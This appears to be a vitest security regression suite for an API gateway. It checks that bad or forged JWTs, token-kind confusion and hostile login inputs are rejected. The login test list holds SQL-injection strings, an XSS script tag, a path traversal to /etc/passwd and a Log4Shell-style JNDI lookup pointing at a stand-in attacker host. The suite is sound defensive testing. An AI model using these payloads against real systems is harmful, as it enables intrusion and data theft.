/**
 * Security regression suite — api-gateway HTTP-surface (T-514).
 *
 * This file is the threat-framed counterpart to the behavioural
 * tests under `__TEST__/services/api-gateway/`. Where `auth.test.ts`
 * proves the happy path works and `rate-limit.test.ts` proves the
 * budget bites, the cases here prove the surface holds up under
 * *hostile* input: forged tokens, bypass attempts, and
 * injection/XSS-shaped payloads.
 *
 * Scope (mapped to the T-514 ticket):
 *   - invalid / malformed / wrong-scheme Authorization headers
 *   - a token forged with a DIFFERENT secret cannot self-mint a role
 *   - SQL-injection-shaped and XSS-shaped login payloads are rejected
 *     cleanly (4xx, never 5xx) and never reflected back to the caller
 *   - error envelopes leak nothing (no stack, no internal paths)
 *
 * Deliberately NOT re-tested here (already pinned elsewhere):
 *   - rate-limit 429 + body-limit 413 → `rate-limit.test.ts`
 *   - login/refresh happy path + role mapping → `auth.test.ts`
 *   - raw JWT verify edge cases → `__TEST__/unit/auth-jwt/jwt.test.ts`
 */
import { createJwtSigner } from "@aip/auth-jwt";
import { createLogger } from "@aip/logger";
import { createRegistry } from "@aip/metrics";
import { afterEach, describe, expect, it } from "vitest";
import { buildApp } from "../../../services/api-gateway/src/app.js";
import { createInMemoryDirectory } from "../../../services/api-gateway/src/auth/directory.js";

const logger = createLogger({ service: "api-gateway-security-test", level: "fatal" });

const REAL_SECRET = "test-only-secret-do-not-use-in-prod-32-bytes-minimum-thanks";
const ISSUER = "aip-api-gateway";

function buildOpts() {
  return {
    logger,
    registry: createRegistry({
      service: "api-gateway-security-test",
      collectDefault: false,
    }),
    signer: createJwtSigner({ secret: REAL_SECRET, issuer: ISSUER }),
    directory: createInMemoryDirectory(),
    // The hostile-input cases fire many requests in a loop; keep the
    // limiter out of the way so a 429 never masks the assertion we
    // actually care about. Rate-limiting itself is proven in
    // `rate-limit.test.ts`.
    rateLimitDisabled: true,
  };
}

let app: Awaited<ReturnType<typeof buildApp>>;
afterEach(async () => {
  await app.close();
});

describe("api-gateway security — Authorization header bypass attempts", () => {
  // `/api/v1/whoami` is the thinnest protected route (requireAuth only,
  // any role). Every malformed credential must land on 401 — never 200,
  // never 500.
  const cases: Array<{ name: string; header: Record<string, string> }> = [
    { name: "no Authorization header", header: {} },
    { name: "empty bearer", header: { authorization: "Bearer " } },
    { name: "bearer with garbage token", header: { authorization: "Bearer not-a-jwt" } },
    {
      name: "bearer with a structurally-jwt-shaped but unsigned token",
      header: { authorization: "Bearer aaa.bbb.ccc" },
    },
    { name: "wrong scheme (Basic)", header: { authorization: "Basic dXNlcjpwYXNz" } },
    { name: "scheme without a token", header: { authorization: "Bearer" } },
    {
      name: "token in the wrong place (raw, no scheme)",
      header: { authorization: "eyJhbGciOiJIUzI1NiJ9.e30.x" },
    },
  ];

  for (const { name, header } of cases) {
    it(`rejects ${name} with 401`, async () => {
      app = await buildApp(buildOpts());
      const res = await app.inject({ method: "GET", url: "/api/v1/whoami", headers: header });
      expect(res.statusCode).toBe(401);
      expect((res.json() as { error: { code: string } }).error.code).toBe("unauthorized");
    });
  }
});

describe("api-gateway security — token forgery cannot escalate privilege", () => {
  it("a token forged with a DIFFERENT secret is rejected (cannot self-mint a session)", async () => {
    app = await buildApp(buildOpts());
    // Attacker signs their own token with a secret they control,
    // claiming to be an operator. The gateway verifies against the
    // REAL secret, so the signature fails and req.auth stays unset.
    const forger = createJwtSigner({
      secret: "attacker-controlled-secret-also-32-bytes-long-yes-indeed",
      issuer: ISSUER,
    });
    const forged = await forger.signAccess({
      user_id: "00000000-0000-0000-0000-00000000dead",
      role: "operator",
    });
    const res = await app.inject({
      method: "GET",
      url: "/api/v1/whoami",
      headers: { authorization: `Bearer ${forged}` },
    });
    expect(res.statusCode).toBe(401);
  });

  it("a self-signed admin claim cannot reach an admin-only route", async () => {
    app = await buildApp(buildOpts());
    // The most dangerous escalation: forge `role: admin` and aim it at
    // the admin surface. Signature verification (not the role claim) is
    // the gate, so this is a 401, never a 200.
    const forger = createJwtSigner({
      secret: "attacker-controlled-secret-also-32-bytes-long-yes-indeed",
      issuer: ISSUER,
    });
    const forgedAdmin = await forger.signAccess({
      user_id: "00000000-0000-0000-0000-00000000dead",
      role: "admin",
    });
    const res = await app.inject({
      method: "GET",
      url: "/api/v1/admin/echo",
      headers: { authorization: `Bearer ${forgedAdmin}` },
    });
    expect(res.statusCode).toBe(401);
  });

  it("an access token issued by the real signer cannot be used as a refresh token", async () => {
    app = await buildApp(buildOpts());
    // Kind confusion: a valid access token is signed by the real
    // secret, so its signature checks out — but `verifyRefresh` must
    // reject it on `kind`, not accept it as a refresh credential.
    const login = await app.inject({
      method: "POST",
      url: "/api/v1/auth/login",
      payload: { email: "pat.operator@airport-ops.test" },
    });
    const { access_token } = login.json() as { access_token: string };
    const res = await app.inject({
      method: "POST",
      url: "/api/v1/auth/refresh",
      payload: { refresh_token: access_token },
    });
    expect(res.statusCode).toBe(401);
    expect((res.json() as { error: { details?: { code?: string } } }).error.details?.code).toBe(
      "wrong_kind",
    );
  });
});

describe("api-gateway security — injection / XSS-shaped input is rejected cleanly", () => {
  // These are JSON endpoints, so a reflected string is not itself an
  // XSS vector (content-type is application/json — no browser executes
  // it). What we DO guarantee: hostile input never crashes the service
  // (no 5xx), never bypasses validation, and is never echoed back in a
  // way that leaks it or an internal path.
  const hostileEmails = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "admin'--",
    "<script>alert(document.cookie)</script>@evil.test",
    "pat.operator@airport-ops.test'; SELECT pg_sleep(10); --",
    "${jndi:ldap://evil.test/a}",
    "../../../../etc/passwd",
  ];

  for (const email of hostileEmails) {
    it(`login rejects ${JSON.stringify(email).slice(0, 40)} with a clean 4xx`, async () => {
      app = await buildApp(buildOpts());
      const res = await app.inject({
        method: "POST",
        url: "/api/v1/auth/login",
        payload: { email },
      });
      // Either 400 (fails email-format validation) or 401 (parses as an
      // address but matches no user). Never 200, never 5xx.
      expect([400, 401]).toContain(res.statusCode);
      expect(res.statusCode).toBeLessThan(500);

      const raw = res.payload;
      // The response must not reflect the raw attacker payload, leak a
      // stack trace, or surface an internal file path.
      expect(raw).not.toContain("<script>");
      expect(raw).not.toContain("DROP TABLE");
      expect(raw).not.toContain("jndi:");
      expect(raw).not.toContain("/etc/passwd");
      expect(raw.toLowerCase()).not.toContain("stack");
      expect(raw).not.toMatch(/\/(?:Users|home|var|src)\//);

      // The error envelope stays generic — no disclosure of which check
      // failed or what the input was.
      const body = res.json() as { error: { code: string; message: string } };
      expect(["validation_failed", "unauthorized"]).toContain(body.error.code);
    });
  }

  it("a non-JSON body on a JSON route fails closed (4xx, not a crash)", async () => {
    app = await buildApp(buildOpts());
    const res = await app.inject({
      method: "POST",
      url: "/api/v1/auth/login",
      headers: { "content-type": "application/json" },
      payload: "this is not json {{{",
    });
    expect(res.statusCode).toBeGreaterThanOrEqual(400);
    expect(res.statusCode).toBeLessThan(500);
  });

  it("an unknown route returns a sanitized 404 with no internals", async () => {
    app = await buildApp(buildOpts());
    const res = await app.inject({ method: "GET", url: "/api/v1/internal/secrets" });
    expect(res.statusCode).toBe(404);
    expect(res.payload.toLowerCase()).not.toContain("stack");
    expect(res.payload).not.toMatch(/\/(?:Users|home|var|src)\//);
  });
});
